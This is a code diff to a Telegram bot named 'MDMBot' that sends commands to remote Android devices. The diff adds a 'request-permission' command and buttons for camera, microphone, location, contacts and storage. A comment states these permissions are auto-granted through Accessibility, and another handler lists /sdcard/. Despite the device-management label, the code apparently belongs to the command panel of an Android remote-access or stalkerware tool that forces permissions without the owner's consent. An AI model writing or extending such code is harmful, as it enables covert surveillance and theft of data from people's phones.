@@ -267,7 +267,18 @@ def get_commands_by_category(cat):
 
 def build_command_payload(cmd_type, params=None):
     cmd = COMMANDS.get(cmd_type)
-    if not cmd: return None
+    # ✅ request-permission is not in COMMANDS dict but should be sent directly
+    if not cmd:
+        if cmd_type == "request-permission":
+            p = {"command": cmd_type, "category": "permissions",
+                 "timestamp": datetime.now(timezone.utc).isoformat()}
+            if params:
+                if isinstance(params, dict):
+                    p["params"] = params
+                else:
+                    p["params"] = {"value": str(params)}
+            return p
+        return None
     p = {"command": cmd_type, "category": cmd["category"],
          "timestamp": datetime.now(timezone.utc).isoformat()}
     if params and cmd["needs_param"]:
@@ -426,7 +437,7 @@ def advanced_keyboard(did):
 def permissions_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     # ✅ Permission request buttons - each requests + auto-grants via Accessibility
-    perm_btn = lambda perm: InlineKeyboardButton(f"🔓 {perm}", callback_data=_cb(did, "param", f"request-permission:{perm}"))
+    perm_btn = lambda perm: InlineKeyboardButton(f"🔓 {perm}", callback_data=_cb(did, "cmd", f"request-permission:{perm}"))
     kb.add(perm_btn("all"), perm_btn("camera"))
     kb.add(perm_btn("microphone"), perm_btn("location"))
     kb.add(perm_btn("storage"), perm_btn("contacts"))
@@ -1139,8 +1150,12 @@ class MDMBot:
                 bot.answer_callback_query(c.id)
 
             elif a == "cmd":
+                # ✅ Handle request-permission:<type> format
+                if tgt.startswith("request-permission:"):
+                    perm_type = tgt.split(":", 1)[1] if ":" in tgt else ""
+                    self._send_cmd(c.message.chat.id, did, "request-permission", {"value": perm_type})
                 # For ls command, default to /sdcard/ if no path specified
-                if tgt == "ls":
+                elif tgt == "ls":
                     self._send_cmd(c.message.chat.id, did, "ls", {"value": "/sdcard/"})
                 else:
                     self._send_cmd(c.message.chat.id, did, tgt)
